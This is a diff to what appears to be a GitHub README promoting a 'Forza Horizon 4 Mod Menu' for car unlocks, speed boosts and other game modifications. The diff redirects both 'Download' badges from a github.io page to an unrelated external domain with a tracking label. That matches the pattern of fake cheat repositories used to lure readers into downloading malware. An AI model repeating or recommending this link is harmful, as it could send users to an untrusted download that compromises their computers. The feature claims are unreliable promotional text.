@@ -2,7 +2,7 @@
 
 The **Forza Horizon 4 Mod Menu** offers a wide array of customizable features that take your racing experience to the next level. Whether you're looking to unlock all cars, modify game settings, or explore new gameplay possibilities, this mod menu gives you the freedom to change the way you play. Enjoy the thrill of racing with enhanced features that add fun, convenience, and unique modifications.
 
-[![Download Forza4 ModMenu](https://img.shields.io/badge/Download-Forza4%20ModMenu-blueviolet)](https://forza-horizon-4-mod-menu.github.io/.github/)
+[![Download Forza4 ModMenu](https://img.shields.io/badge/Download-Forza4%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -36,4 +36,4 @@ The **Forza Horizon 4 Mod Menu** offers a wide array of customizable features th
 3. **Activate Your Preferred Features**: Choose from a variety of options, including car unlocks, speed boosts, and game modifications.
 4. **Enjoy the Enhanced Experience**: Test out the features, race with powerful cars, or explore the new world with your custom settings.
 
-[![Download Forza4 ModMenu](https://img.shields.io/badge/Download-Forza4%20ModMenu-blueviolet)](https://forza-horizon-4-mod-menu.github.io/.github/)
+[![Download Forza4 ModMenu](https://img.shields.io/badge/Download-Forza4%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
